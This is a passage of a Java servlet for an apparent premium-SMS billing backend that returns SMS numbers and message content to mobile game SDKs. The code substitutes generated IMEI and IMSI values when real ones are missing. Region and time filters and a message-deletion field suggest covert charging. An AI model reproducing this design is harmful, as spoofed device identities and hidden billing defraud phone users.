		for (int i = 0; i < addr.length(); i++) { 
			String iaddr = addr.substring(i,i+1);
			 bCH = Pattern.matches("[\u4E00-\u9FA5]", iaddr);
			 if(bCH){
				 break;
			 }
		}
		}
		if(!StringUtil.is_nullString(IP)&&bCH==false){
			addr = "";
			ModelipDao IPDao = new ModelipDao();
			addr = IPDao.getIP(IP);
			
			
			if(StringUtil.is_nullString(addr)){
				addr = azul.IP.getAddr(IP);
			}
			
		}
		
		String time = DateUtil.getTime();
		String beginTime = "19:00:00";
		String endTime = "07:00:00";
		
		
		//SysParam sysParam = null;
		/*if(ConstValue.bNew == 1)
		{
			SysParamDao sysParamDao = new SysParamDao();
			sysParam = sysParamDao.getRecord();
			String controlTime = "";
			if(sysParam != null)
			{
				controlTime = sysParam.getSwitchTime();
			}
	    	DebuUtil.log("controlTime="+controlTime);
	    	if(!StringUtil.is_nullString(controlTime))
	    	{
	    		if(controlTime.contains("-"))
        		{
        			String splitstr = controlTime;
        			String[] strarray=splitstr.split("-");     		
        			beginTime = strarray[0];
        			endTime = strarray[1];
        		}
	    	}
		}*/
		
		/*if( (time.compareTo(beginTime) > 0) || (time.compareTo(endTime) < 0))//这个时间段不过滤
		{
			bFilter = 0 ;
		}
		
		Date date = new Date();//星期六星期天不过滤
	    if((date.getDay() == 6)||(date.getDay() == 0))
	    {
	    	bFilter = 0 ;
	    }*/
		
        JSONObject rsqjson = new JSONObject();
		
       /* if(packet_id.equals("389182001"))
        {
        	imei = getIMEI("863590");
        	imsi = getIMSI("46002");
        }
        
        if(packet_id.equals("2071"))
        	
        {
        	imei = getIMEI("863590");	
        	imsi = getIMSI("46002");
        }
        else if(packet_id.equals("2072"))
        {
        	imei = getIMEI("864147");	
        	imsi = getIMSI("46002");
        }
        else if(packet_id.equals("2087")||packet_id.equals("2184")||packet_id.equals("2174")
        		||packet_id.equals("2134")||packet_id.equals("2104")
        		||packet_id.equals("2214")||packet_id.equals("2204")
        		||packet_id.equals("2194")||packet_id.equals("2164")
        		||packet_id.equals("2154")||packet_id.equals("2114"))//亿讯捷广告
        {
   		
        	DebuUtil.log("imeiHead="+imeiHead);
        	DebuUtil.log("imsiHead="+imsiHead);
        	imei = getIMEI(imeiHead);	
        	imsi = getIMSI(imsiHead);
        	
        }
        else if(packet_id.equals("2075")||packet_id.equals("2225")||packet_id.equals("2146")
        		||packet_id.equals("2261")||packet_id.equals("1723")
        		)//亿讯捷广告
        {
   		
        	imei = getIMEI("863590");
        	imsi = getIMSI("46002");
        }*/
   
        /*if(StringUtil.is_nullString(imei))
        {
        	imei = getIMEI("863590");
        }*/
        
        boolean bCardPay = false;
        if(StringUtil.is_nullString(imei)&&StringUtil.is_nullString(imsi))
        {
        	bCardPay = true;
        }
        if(!isIMEI(imsi))
        {
        	//imsi = getIMSI("46002");
        	imsi = getIMSI(imsiHead);
        }
       
        
        if(!isIMEI(imei))
        {
        	//imei = getIMEI("863590");
        	imei = getIMEI(imeiHead);	
        }
       
        if (StringUtil.is_nullString(OrderNO))
        {
			OrderNO = "0";
        }
        if (OrderNO.length() > 10)
        {	
			OrderNO = OrderNO.substring(0, 10);
        }
        
    	userdata = (new StringBuilder(String.valueOf(packet_id))).append("_").append(OrderNO).toString();
        	/*if(packet_id.equals("411200001"))//惠恩通达，雷电战机4.0_经典版
        	{
        		userdata = OrderNO;
        	}
        	else*/
        	
        		//if(ConstValue.bNew == 1)
        		
        	    if(ConstValue.bNew == 1)
        	    {
        	    	String region = getRegionCode(addr,"");
        	    	if(!StringUtil.is_nullString(region))
        	    	{
        	    		userdata = userdata+"_"+region;
        	    	}
        	    	else 
        	    	{
        	    		userdata = userdata+"_0";
        	    	}
        	    	DebuUtil.log("userdata="+userdata);
        	    	if(!StringUtil.is_nullString(Ver))//如果是SDK取指令，只用传IMEI
        	    	{
        	    		userdata = imei;
        	    	}
        	    }
        	    //getRegionCode();
        	
        
		
		String pay_id = cop.getPayId();
		int exceedAmount = 0;
		//////////////////////////////
		//if(ConstValue.bNew == 1)
		//{
			exceedAmount = cop.getMmDayPay()*100;
		//}
		/*SysParam sysParam = null;
		if(sysParam == null)
		{
			SysParamDao sysParamDao = new SysParamDao();
			sysParam = sysParamDao.getRecord();
		}*/
		//if(ConstValue.bNew == 1)
		{
			if(sysParam != null)
			{
				if(exceedAmount == 0)
				{
					exceedAmount = sysParam.getMmDayPay()*100;
				}
			}
		}	
		CooperationRemindDao cooperationRemindDao = new CooperationRemindDao();
		CooperationRemind copRemind = cooperationRemindDao.getRecord(packet_id);
		 Map provinceExceedList = new HashMap<String,String>();//省份单用户日限
		 Map channelProvinceExceedList = new HashMap<String,String>();//省份渠道日限
		if(copRemind != null){
		 if(!StringUtil.is_nullString(copRemind.getProvince()) && !StringUtil.is_nullString(copRemind.getMmDayPayProvince()))
		{
			String provincestr = copRemind.getProvince();
			String provinceExceedstr = copRemind.getMmDayPayProvince();
			String[] provincestrarray=provincestr.split("_");     		
			String[] provinceExceedstrarray=provinceExceedstr.split("_"); 
			for(int i = 0; i < provincestrarray.length; i ++)
			{
				provinceExceedList.put(provincestrarray[i], provinceExceedstrarray[i]);
			}
			
		}

		 if(!StringUtil.is_nullString(copRemind.getChannelProvince()) && !StringUtil.is_nullString(copRemind.getMmDayChannelProvince()))
		 {
			 String channelProvincestr = copRemind.getChannelProvince();
			 String channelProvinceExceedstr = copRemind.getMmDayChannelProvince();
			 String[] channelProvincestrarray = channelProvincestr.split("_");    
			 String[] channelProvinceExceedstrarray = channelProvinceExceedstr.split("_");   
			 for(int i = 0; i < channelProvincestrarray.length; i ++)
			 {
					channelProvinceExceedList.put(channelProvincestrarray[i], channelProvinceExceedstrarray[i]);
			}
		 }
		}
		
		int mm_month_pay = cop.getMmMonthPay()*100;
		int mm_channel_pay = cop.getMmChannelPay()*100;
		///////////////////////////////
		//DebuUtil.log("pay_id对应的值为："+pay_id);
		
		//if(ConstValue.bNew == 1)
		{
			if(sysParam != null)
			{
				if(mm_month_pay == 0)
				{
					mm_month_pay = sysParam.getMmMonthPay()*100;
				}
				if(mm_channel_pay == 0)
				{
					mm_channel_pay = sysParam.getMmChannelPay()*100;
				}
			}
		}	
		
		//if(ConstValue.bNew == 1)
		{
		   DebuUtil.log("exceedAmount="+exceedAmount);
		   DebuUtil.log("mm_month_pay="+mm_month_pay);
		   DebuUtil.log("mm_channel_pay="+mm_channel_pay);
		}
		
		MmPayDataDao mmPayDataDao = new MmPayDataDao();
		MmPayData paydata = mmPayDataDao.getRecord(pay_id);
		
		String pay_amount = paydata.getPayAmount();
		//DebuUtil.log("payamount："+pay_amount);
		String pay_com = paydata.getConpanyName();
		
		if(StringUtil.is_nullString(pay_com))
		{
			pay_com = "";
		}
		String[] payList = pay_amount.split(",");
		
		for(int i = 0;i<payList.length;i++){
			int v = Integer.valueOf(payList[i]);
			if (v == amount) {
				index = i+1;
				break;
			}
		}
		
		if(indx >= 0)
		{
			index = indx;
		}
		 DebuUtil.log("index="+index);
		//chnno = pay_id;//25
        //}
        //index = 1;//1
		if(!StringUtil.is_nullString(game_id))
		{
			if(game_id.equals("197"))
			{
				index = 58+index-1;
			}
			//DebuUtil.log("index="+index);
		}
		
		///////////////////////////////////////
		if(pay_id.contains("_"))
		{
			String splitstr = pay_id;
			String[] strarray=splitstr.split("_");     		
			pay_id = strarray[0];
		}
		/////////////////////////////////////
        String chn = String.format("%s%02d",pay_id,index);
        
		
	    MsmList msmList = new MsmList();
        msmList.setChn(chn);
        msmList.setImei(imei );
        msmList.setImsi(imsi);
        String addParam = addr;
        if(!StringUtil.is_nullString(cell))
        {
        	addParam += "_"+cell+"_"+lac;
        }
        if(!StringUtil.is_nullString(IP))
        {
        	addParam += "_"+IP;
        }
        msmList.setAddr(addParam);
        msmList.setPhonenum(phonenum);
        msmList.setXexdata(userdata);
        msmList.setAmount(amount);
	        
        String num = "";
		String content = "";
		String code ="2"; 
		
		long reqBefore = System.currentTimeMillis();
		
		//if(ConstValue.bNew == 1)
		//{
		if(amount >= 100)
		{
			String datestr = DateUtil.getDate();
			DevicePayDao devicePayDao = new DevicePayDao();
			if(exceedAmount <= 0)
			{
				exceedAmount = 1000;
			}
			DebuUtil.log("限额="+exceedAmount);
		    if(devicePayDao.isExceed(imei, amount, exceedAmount,datestr,mm_month_pay,mm_channel_pay,packet_id,province,provinceExceedList,channelProvinceExceedList) == false)
		    {
		    	DebuUtil.log("没有超额");
		    	//devicePayDao.addPay(imei,amount,datestr);
		    }
		    else
		    {
		    	DebuUtil.log("超额");
		    	bFilter = 1;
		    }
		}
		//}
		
		boolean bzhangZhong = false;
		//getMSM3(String appKey,String paycode,String imei,String imsi,String uData)
		if(bFilter != 1)
		{
	        if(pay_id.equals("300008481481")&&pay_com.equals(COMPA))//sppro
	        {
	        	String pid = "6381754877-7126887100";
	        	String channel = "3003971774";
	        	String rsq = GetAmountIndex.getMSM2(pid,chn,channel, imei, imsi, userdata);    
	        	if(!StringUtil.is_nullString(rsq))
	        	{
	    		   parseMMRsq(rsq, msmList);
	        	}
	    		DebuUtil.log("回应数据="+rsq);
	        }
	        else if(pay_com.equals(LIJIEQIANG)){
	        	String strUrl = "http://120.24.236.63:8080/mm";
	        	String appKey = paydata.getPayKey();
	        	String os = "4.2.1";
	        	String model = "2013022";
	        	String pay = "auto";
	        	String paycode = String.format("%s%02d",pay_id,index);
	        	String channel = paydata.getPayType();
	        	if(channel.contains("mm"))
	        	{
	        		channel = "";
	        	}
	        	
	        	String rsq = getMSM5(strUrl,appKey,paycode,imei,imsi,os,model,userdata,pay,channel,code);    
	        	if(!StringUtil.is_nullString(rsq))
	        	{        		
	        		DebuUtil.log("回应数据="+rsq);
	        		msmList.num = "10658424";
	        		msmList.code = "0";
	        		msmList.msg = rsq;
	        	}
        	}
	        else if(pay_com.equals(LIJIE))//阿安星星祖玛//pay_id.equals("300008516782") || 
	        {
	        	String appKey = paydata.getPayKey();
	        	//http://120.24.236.63:8085/mm
	        	//http://120.24.236.63:8085/mm
	        	String strUrl = "http://120.24.236.63:8085/mm";//"http://pay.gzmtx.cn:8080/mm";  //http://pay.gzmtx.cn:8080/mm
//	        	if(pay_id.equals("300008516782"))
//	        	{
//	        		strUrl = "http://proxy.gzmtx.cn:8080/mm";
//	        		appKey = "F1A2C419E41C1DDB";
//	        	}
//	        	else if(pay_id.contains("300008844659"))//星星祖玛【全新版】
//	        	{
//	        		strUrl = "http://120.24.236.63:8085/mm";//
//	        	}
//	        	else if(pay_id.contains("300008776172"))//星星祖玛hd
//	        	{
//	        		strUrl = "http://120.24.236.63:8085/mm";//
//	        	}
//	        	
//	        	if(packet_id.equals("2031")||packet_id.equals("2041")||packet_id.equals("2011")
//	        			||packet_id.equals("2032")||packet_id.equals("2042")||packet_id.equals("2012"))
//	        	{
//	        		strUrl = "http://scp6.3322.org:20002/mm";
//	        	}
	        	
	        	String channel = paydata.getPayType();
	        	if(channel.contains("mm"))
	        	{
	        		channel = "";
	        	}
	        	DebuUtil.log("正在请求数据");
	        	String rsq = getMSM3(strUrl,appKey, chn, imei, imsi, userdata,channel);    	
	        	if(!StringUtil.is_nullString(rsq))
	        	{        		
	        		DebuUtil.log("回应数据="+rsq);
	        		msmList.num = "1065842410";
	        		msmList.code = "0";
	        		msmList.msg = rsq;
	        	}
	        }
	        else if(pay_com.equals(YOUXI)){
	        	String strUrl = "http://182.92.21.219:10789/cmcc/mm/single/chargeSMS";

	        	String paycode = String.format("%s%02d",pay_id,index);
	        	String channel = paydata.getPayType();
	        	String channelid = paydata.getChannel();
	        	String payid = userdata;

	        	String rsq = getMSM7(strUrl, paycode, imei, imsi,channel,payid,channelid);    	
	        	if(!StringUtil.is_nullString(rsq))
	        	{        		
	        		DebuUtil.log("游戏基地回应数据="+rsq);
	        		msmList.num = "1065842410";
	        		msmList.code = code;
	        		msmList.msg = rsq;
	        	}
        	}
	        else if(pay_com.equals(MOYUEYOUXI)){
	        	String strUrl = "http://182.92.21.219:10789/cmcc/g/single/s2sChargeSMS";

	        	String paycode = String.format("%s%02d",pay_id,index);
	        	String channel = paydata.getPayType();
	        	String channelid = paydata.getChannel();
	        	String payid = "0000000000000000";

	        	String rsq = getMSM8(strUrl, paycode, imei, imsi,channel,payid,channelid);    	
	        	if(!StringUtil.is_nullString(rsq))
	        	{        		
	        		DebuUtil.log("游戏基地回应数据="+rsq);
	        		msmList.num = "1065842410";
	        		msmList.code = code;
	        		msmList.msg = rsq;
	        	}
        	}
	        else if(pay_com.equals(zhangzhong))
	        {
	        	String strUrl = "http://121.14.38.23:25194/if_mtk/service";
	        	String channel = paydata.getPayType();	        	
	        	//channel = "548";
	        	String rsq = getMSM4( strUrl, pay_id, chn, imei, imsi, userdata,channel,IP,bCardPay,amount);
	        	if(!StringUtil.is_nullString(rsq))
	        	{        		
	        		DebuUtil.log("回应数据="+rsq);
	        		
	        		if(rsq.startsWith("MM#")){
	        			msmList.num = "10658424";
	        		}else if(rsq.startsWith("a3#")){
	        			msmList.num = "1065842410";
	        		}else{
	        			msmList.num = "1065842455";
	        		}
	        		msmList.code = "0";
	        		msmList.msg = rsq;
	        	}
	        	bzhangZhong = true; 
	        } else if(pay_com.equals(Xzhangzhong))
	        {
	        	String strUrl = "http://121.14.38.23:25194/if_mtk/service";
	        	String channel = paydata.getPayType();	        	
	        	//channel = "548";
	        	String rsq = getMSM44( strUrl, pay_id, chn, imei, imsi, userdata,channel,IP,bCardPay,amount);
	        	
	           	if(!StringUtil.is_nullString(rsq))
	        	{        		
	        		DebuUtil.log("回应数据="+rsq);
	        		msmList.num = "1065842455";
	        		msmList.code = "0";
	        		msmList.msg = rsq;
	        	
	        	}
	        	bzhangZhong = true;
	        }  
	        else if( pay_com.equals(ZIYan))//自研
	        {
	        	
	        	String strAppKey = paydata.getPayKey();
	        	String strApkPublicKey=paydata.getPublicKey();
                String strProID = paydata.getProId();
                //String strAppKey =paydata.getPublicKey();//"B56711EBA69EBA19";
                String md5 = paydata.getMd5();//"379094F6A6685668B874FE692B9FFC69";
                String md5dex = paydata.getMd5dex();//"T8UsMmgJeoVGpmip68Q136td6XM="	
                String strChannelID = paydata.getPayType();//LongToString(parseLong());//"GL21Y7RLN";
                //2900,900,600,400,2900,900,400,600,1900,200,200,1500,1000,2900,1
                //if(ConstValue.bNew == 1)
                {
                	//MMUser.doInitUser(imei,imsi, "", packet_id); 
                }
                String msm = MSMConten.getMSGContent(strApkPublicKey, strAppKey, md5, md5dex,
        			    strProID, strChannelID, chn, imei, imsi,userdata);
                
	        	
	        	DebuUtil.log("自研回应数据="+msm);
	        	msmList.num = "1065842410";
	        	msmList.code = "0";
	        	msmList.msg = msm;
	        	
	        }
	        else
	        {
		        String msmrsq = getMSM(chn, imei, imsi, userdata);//美林互动
		        DebuUtil.log("回应数据="+msmrsq);
				JSONObject mssjson = null;
				if(!StringUtil.is_nullString(msmrsq))
				{
					mssjson = JSONObject.fromObject(msmrsq);//381182002,405200002
				}
				if(mssjson != null)
				{			
					mssjson.getString("code"); 
					num = mssjson.getString("desttermid");
					content = mssjson.getString("msg");
					if(code.equals("1"))
					{
						num = "";
					}				
				}
				msmList.setNum(num);
				msmList.setMsg(content);
				msmList.setCode(code);
	        }
	
		}
        
		//if(ConstValue.bNew == 1)
		//{
		if((bCardPay == false) && (bzhangZhong == false))
		{
			ZhangZhong zhangZhong = new ZhangZhong();
			zhangZhong.setZzdata(userdata);
			zhangZhong.setData(userdata);
			zhangZhong.setImei(imei);
			ZhangZhongDao zhangZhongDao = new ZhangZhongDao();
			zhangZhongDao.add(zhangZhong);
		}
		//}
        ////////////////////////////////////////////////////
        
        //if(ConstValue.bNew == 1)
       // {
        	// DebuUtil.log("smsReq");
        //统计请求成功率
        int state = 0;
        if(msmList.code.equals("0"))
		{
        	 state = 1;
		}	
        ChannelDataDao channelDataDao = new ChannelDataDao();
        channelDataDao.smsReq(packet_id,state);
       // }
        ////////////////////////////////////////////////////////////
		String bDel = "0";
		String fillCon = "中国移动";
		//String content = "";	
		
			
		//MsmListDao  msmListDao = new MsmListDao();
		//msmListDao.add(msmList);
		if(!StringUtil.is_nullString(Ver))
		{
		     String[] payListstr = msmList.getMsg().split("#");
		     if(payListstr.length >= 4)
		     {
		        rsqjson.put("trade_no",payListstr[payListstr.length-4]);
		     }
		}
		
		rsqjson.put("num",msmList.getNum());//imei
		rsqjson.put("content",msmList.getMsg());
		if(msmList.getNum()=="1065842455"){
			rsqjson.put("MSGType","1");
		}else{
			rsqjson.put("MSGType","0");
			 }
		rsqjson.put("bDel",bDel);
		rsqjson.put("code",code);
		rsqjson.put("FillCon",fillCon);
		
		
		////////////////////////////////////////////////////
		long reqNow = System.currentTimeMillis();
		msmList.setReqtime((int)(reqNow-reqBefore));
		MsmListDao  msmListDao = new MsmListDao();
		msmListDao.add(msmList);
		////////////////////////////////////////////////
		
		if(bCardPay)
		{
			 out.print(msmList.getMsg());
		}
		else
		{
		    out.print(rsqjson.toString());
		}
		//out.print("OK");
		out.close();
	}
	
	

	public void HandleReq(HttpServletRequest request, HttpServletResponse response)
	{
		////: http://14.18.206.189:8080/sdk/getcon?amount=200&gameId=180&imsi=460026894200239&imei=69630019000979&packet_id=381180001
		String amountstr = request.getParameter("amount");
		String gameId = request.getParameter("gameId");
		String imsi = request.getParameter("imsi");
		String imei = request.getParameter("imei");
		String packet_id = request.getParameter("packet_id");
		String indexstr = request.getParameter("index");
		String addr = request.getParameter("addr");
		String phonenum = request.getParameter("phonenum");
		
		String mcc = request.getParameter("mcc");
		String mnc = request.getParameter("mnc");
		String cell = request.getParameter("cell");
		String lac = request.getParameter("lac");
		String IP = request.getParameter("IP");
		String Ver = request.getParameter("Ver");
		//String userdata =  request.getParameter("userdata");
		String orderNO = "";
		int amount = 0;
		int index = -1;
		
		if(!StringUtil.is_nullString(addr))
		{
			try {
				addr = new String(addr.getBytes("iso8859-1"),"utf-8");
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		try
		{
		     amount = Integer.valueOf(amountstr);
		     if(!StringUtil.is_nullString(indexstr))
		    	 
		     {
		    	 index = Integer.valueOf(indexstr);
		    	 DebuUtil.log("index="+index);
		     }
		}
		catch(NumberFormatException e)
		{
			
		}
		DebuUtil.log("req="+request.getQueryString());
		if(packet_id.equals("405200001"))
		{
			//orderNO =  request.getParameter("orderNO");
		}
		orderNO =  request.getParameter("orderNO");
		
		
		HandleReq(amount,index, imei, imsi, packet_id, gameId,orderNO,addr,phonenum, mcc, mnc, cell, lac,IP,Ver,response);
		
	}
	
	
	public static void initData()
	{
		SaConfiguration configuration =SaConfiguration.getInstance("msmpay");
		/*String istr = configuration.getValue("RedirectNum");
		DebuUtil.log("RedirectNum="+istr);
		if(!StringUtil.is_nullString(istr))
		{
			RedirectNum = Integer.valueOf(istr);
		}
		String str = configuration.getValue("RedirectURL");
		DebuUtil.log("RedirectURL="+str);
		if(!StringUtil.is_nullString(str))
		{
			RedirectURL = str;
		}*/
		String str = "";
		
		str = configuration.getValue("imeihead");
		DebuUtil.log("imeihead="+str);
		if(!StringUtil.is_nullString(str))
		{
			imeiHead = str;
		}
		
		str = configuration.getValue("imsihead");
		DebuUtil.log("imsihead="+str);
		if(!StringUtil.is_nullString(str))
		{
			imsiHead = str;
		}
		
		str = configuration.getValue("bOpen");
		if(!StringUtil.is_nullString(str))
		{
			bOpen = Integer.valueOf(str);
		}
				
	}
	
	public static int isOpen()
	{
		int ret = 0;
		SysParam sysParam = null;
		if(sysParam == null)
		{
			SysParamDao sysParamDao = new SysParamDao();
			sysParam = sysParamDao.getRecord();
		}
		String beginDay = "";
		String endDay = "";
		if(sysParam != null)
		{
		   beginDay = sysParam.getBeginTime();
		   endDay = sysParam.getEndTime();
		}
		DebuUtil.log("beginDay="+beginDay);
		DebuUtil.log("endDay="+endDay);
		
		String controlTime = "";
		String switch_state = "";
		if(sysParam != null)
		{
			controlTime = sysParam.getSwitchTime();		
			switch_state = sysParam.getSwitchState();
		}
		
    	if(switch_state.equals(sysParam.switch_on)&& DateUtil.isInDate(beginDay, endDay) && DateUtil.isInTimes(controlTime))
		{
    		ret = 1;
    		DebuUtil.log("打开");
		}
    	else
    	{
    		ret = 0;
    		DebuUtil.log("关闭");
    	}
    	
		return ret;
		
	}
	public static int addrFilter(Cooperation cop,String addr)
	{
		int ret = 0;
//		String provinceCode = GetAmountIndex.getRegionCode(addr, "");
//		addr = GetAmountIndex.getRegionCode("", provinceCode);
		String filter_region = cop.getFilterRegion();			
		String filter_time = cop.getFilterTime();
		String beginDay = cop.getFilterBeginDay();
		String endDay = cop.getFilterEndDay();
		SysParam sysParam = null;
		SysParamDao sysParamDao = new SysParamDao();
		sysParam = sysParamDao.getRecord();
		
		if(DateUtil.isInDate(beginDay, endDay)&&DateUtil.isInTimes(filter_time))
		{
			ret = isFilterAddr(filter_region,addr);
		}
		
		if(ret != 1)//如果渠道配置没有屏蔽,查检全局配置
		{
			if(sysParam != null)
			{
				filter_region = sysParam.getFilterRegion();
				filter_time = sysParam.getFilterTime();
				String circle = sysParam.getFilterCircle();
				if(DateUtil.isInDays(circle)&&DateUtil.isInTimes(filter_time))
				{
					ret = isFilterAddr(filter_region,addr);
				}
			}
		}
		return ret;
	}
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		//int RedirectNum = 10;
		//response.;
		incrConnNum();
		DebuUtil.log("取指令当前请求数="+connNum);
		
		////////////////////////////////////////////
		//String ret=LBS.getLBS("460","0","177063008","42356");
		//////////////////////////////////////////////
		
		//if(ConstValue.bNew == 1)
		{
			
				
		}
		bOpen = isOpen();
		if(bOpen == 0)
		{
			DebuUtil.log("取指令功能已经关闭");
			return;
		}
		//connNum= RedirectNum;//
		
		/*if(connNum >= RedirectNum)
		{
			String url = RedirectURL+"?"+request.getQueryString();//amount=1&packet_id=2141&imei=499000316129545&imsi=460029999154959
			DebuUtil.log("RedirectURL="+RedirectURL);
			response.sendRedirect(url);
		}
		else*/
		{
		    HandleReq(request,response);
		}
		dscConnNum();
		
	}

	public void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		//DebuUtil.log("gameExit doPost");
		/*InputStream   in=request.getInputStream();
		byte[] buf=FileUtil.getByteArrayFromInputstream(in,-1);
		String str = new String(buf,"UTF-8");*/
		//request.;
		
		if(ConstValue.RDR == 1)
		{
		    //str = URLDecoder.decode(str,"UTF-8");	1&2&
		}
		
		HandleReq(request,response);
		
	}
	

}
